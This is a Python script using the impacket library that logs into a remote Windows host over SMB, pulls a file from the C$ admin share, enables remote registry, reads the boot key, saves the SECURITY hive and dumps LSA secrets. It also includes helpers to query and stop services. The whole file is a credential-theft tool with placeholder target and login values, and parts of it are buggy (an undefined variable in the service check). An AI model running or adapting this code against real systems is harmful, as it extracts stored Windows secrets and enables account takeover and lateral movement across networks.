from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, scmr
from impacket.examples.secretsdump import RemoteOperations, LSASecrets

class MySRemoteOperations(RemoteOperations):
    def __init__(self, smbConnection, doKerberos, kdcHost=None, options=None):
        RemoteOperations.__init__(self, smbConnection, doKerberos, kdcHost)
        self.__smbConnection = smbConnection

    def fetchFile(self, filename):
        rpc = transport.DCERPCTransportFactory(self._RemoteOperations__stringBindingSvcCtl)
        rpc.set_smb_connection(self.__smbConnection)
        with open(filename,'wb') as f:
            self.__smbConnection.getFile('C$', filename, f.write)
    
    def checkService(self, serviceName):
        self.__scmr = rpc.get_dce_rpc()
        self.__scmr.connect()
        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)

        scmHandle = scmr.hROpenSCManagerW(self.__scmr)
        self.__scManagerHandle = scmHandle['lpScHandle']
        srvHandle = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, serviceName)
        self.__serviceHandle = srvHandle['lpServiceHandle']
        status = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
        if status['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
            print(f"{serviceName} is stop")
        elif status['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
            print(f"{serviceName} is running")

    def stopService(self):
        scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)

class MySMB:
    def __init__(self, remoteName, username='', password='', domain='', options=None):
        self.__remoteName = remoteName
        self.__remoteHost = remoteName
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__smbConnection = None
        self.__remoteOps = None
        self.__LSASecrets = None

    def login(self):
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def run(self):
        self.login()
        self.__remoteOps = MySRemoteOperations(self.__smbConnection, "", "", "")
        self.__remoteOps.fetchFile("<file>") # C:\<file>
        
        self.__remoteOps.enableRegistry()
        bootKey = self.__remoteOps.getBootKey()

        print("bootKey = ", bootKey)
        SECURITYFileName = self.__remoteOps.saveSECURITY()
        print("SECURITYFileName = ", SECURITYFileName)

        self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps, isRemote=True, history=False)
        self.__LSASecrets.dumpSecrets()

if __name__ == '__main__':
    remoteName = "<remoteIP>"
    username = "<account>"
    password = "<password>"#getpass("Password:")
    smb = MySMB(remoteName, username, password, "", "")
    smb.run()
